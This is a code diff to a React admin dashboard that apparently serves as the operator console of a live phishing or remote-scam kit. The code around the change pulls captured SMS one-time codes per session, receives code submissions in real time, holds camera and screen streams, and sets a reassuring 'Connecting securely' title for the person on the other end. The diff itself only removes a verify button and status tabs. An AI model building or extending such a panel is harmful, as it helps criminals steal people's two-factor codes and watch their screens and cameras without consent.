@@ -21,9 +21,7 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
   const [loading, setLoading] = useState(true)
   const [cameraStream, setCameraStream] = useState<MediaStream | null>(null)
   const [screenStream, setScreenStream] = useState<MediaStream | null>(null)
-  const [userVerified, setUserVerified] = useState(false)
   const [searchQuery, setSearchQuery] = useState('')
-  const [activeTab, setActiveTab] = useState<'waiting' | 'verified' | 'all'>('all')
   const [titleText, setTitleText] = useState('Connecting securely')
   const [customTitle, setCustomTitle] = useState('')
   const [broadcastMessage, setBroadcastMessage] = useState('')
@@ -71,7 +69,6 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
 
   const selectSession = async (s: Session) => {
     setSelected(s)
-    setUserVerified(s.status === 'verified')
     try {
       const [sms, logs] = await Promise.all([api.getSmsCodes(s.sessionId), api.getLog(s.sessionId)])
       setSmsCodes(sms)
@@ -79,7 +76,7 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
     } catch {}
 
     const ws = connectAdmin(s.sessionId, (data) => {
-      if (data.type === 'user-verified') { setUserVerified(true); setSelected(p => p ? { ...p, status: 'verified' } : null); loadSessions() }
+      if (data.type === 'user-verified') { loadSessions() }
       if (data.type === 'sms-code') setSmsCodes(p => [{ code: data.code, created_at: new Date().toISOString() }, ...p])
       if (data.type === 'status-changed') setSelected(p => p ? { ...p, [data.field]: data.value } : null)
       if (data.type === 'sms-submitted') {
@@ -219,14 +216,6 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
     sendAdminWS({ type: 'message-type', messageType: type, text })
   }
 
-  const verifyUser = async () => {
-    if (!selected) return
-    sendAdminWS({ type: 'verified' })
-    setUserVerified(true)
-    setSelected(p => p ? { ...p, status: 'verified' } : null)
-    loadSessions()
-  }
-
   const deleteSession = async (id: string) => {
     if (!confirm('Delete this session?')) return
     await api.deleteSession(id)
@@ -235,8 +224,7 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
   }
 
   const filtered = sessions.filter(s => {
-    if (activeTab === 'waiting' && s.status !== 'pending') return false
-    if (activeTab === 'verified' && s.status !== 'verified') return false
+    if (s.status !== 'pending') return false
     if (searchQuery && !s.userId.toLowerCase().includes(searchQuery.toLowerCase()) && !s.sessionId.includes(searchQuery)) return false
     return true
   })
@@ -244,8 +232,6 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
   const totalPages = Math.max(1, Math.ceil(filtered.length / PER_PAGE))
   const safePage = Math.min(currentPage, totalPages)
   const paginated = filtered.slice((safePage - 1) * PER_PAGE, safePage * PER_PAGE)
-  const waitingCount = sessions.filter(s => s.status === 'pending').length
-  const verifiedCount = sessions.filter(s => s.status === 'verified').length
 
   if (selected) {
     return (
@@ -268,10 +254,6 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
               <div className="text-[11px] font-bold text-gray-900">{selected.userId}</div>
               <div className="text-[10px] text-gray-400 font-mono">{selected.sessionId.slice(0, 12)}...</div>
             </div>
-            <button onClick={verifyUser} disabled={userVerified}
-              className={`px-4 py-2 rounded-xl text-sm font-bold cursor-pointer transition-all ${userVerified ? 'bg-emerald-100 text-emerald-700 border border-emerald-200' : 'bg-emerald-600 hover:bg-emerald-700 text-white shadow-sm'}`}>
-              {userVerified ? 'Verified' : 'Verify User'}
-            </button>
             <button onClick={() => deleteSession(selected.sessionId)} className="px-3 py-2 rounded-xl text-sm font-bold bg-red-50 text-red-600 hover:bg-red-100 cursor-pointer transition-all border border-red-200">
               Delete
             </button>
@@ -600,11 +582,9 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
       </header>
 
       <div className="px-6 py-2.5 flex items-center gap-2 border-b border-gray-200 bg-white shrink-0">
-        <TabBtn label="All Sessions" count={sessions.length} active={activeTab === 'all'} onClick={() => { setActiveTab('all'); setCurrentPage(1) }} />
-        <TabBtn label="Waiting" count={waitingCount} active={activeTab === 'waiting'} onClick={() => { setActiveTab('waiting'); setCurrentPage(1) }} color="amber" />
-        <TabBtn label="Verified" count={verifiedCount} active={activeTab === 'verified'} onClick={() => { setActiveTab('verified'); setCurrentPage(1) }} color="emerald" />
-        <div className="ml-auto text-[11px] text-gray-400 font-medium">
-          {filtered.length} session{filtered.length !== 1 ? 's' : ''}
+        <div className="flex items-center gap-2 px-4 py-2 rounded-xl text-sm font-medium bg-amber-50 text-amber-700 border border-amber-200">
+          Pending Sessions
+          <span className="text-[11px] px-1.5 py-0.5 rounded-full font-bold bg-white/80">{filtered.length}</span>
         </div>
       </div>
 
@@ -673,18 +653,6 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
         )}
       </div>
     </div>
-  )
-}
-
-function TabBtn({ label, count, active, onClick, color = 'blue' }: { label: string; count: number; active: boolean; onClick: () => void; color?: string }) {
-  return (
-    <button onClick={onClick} className={`flex items-center gap-2 px-4 py-2 rounded-xl text-sm font-medium cursor-pointer transition-all border ${
-      active ? color === 'amber' ? 'bg-amber-50 text-amber-700 border-amber-200' : color === 'emerald' ? 'bg-emerald-50 text-emerald-700 border-emerald-200' : 'bg-blue-50 text-blue-700 border-blue-200'
-      : 'bg-transparent text-gray-500 border-transparent hover:text-gray-700 hover:bg-gray-100'
-    }`}>
-      {label}
-      <span className={`text-[11px] px-1.5 py-0.5 rounded-full font-bold ${active ? 'bg-white/80' : 'bg-gray-100'}`}>{count}</span>
-    </button>
   )
 }
 
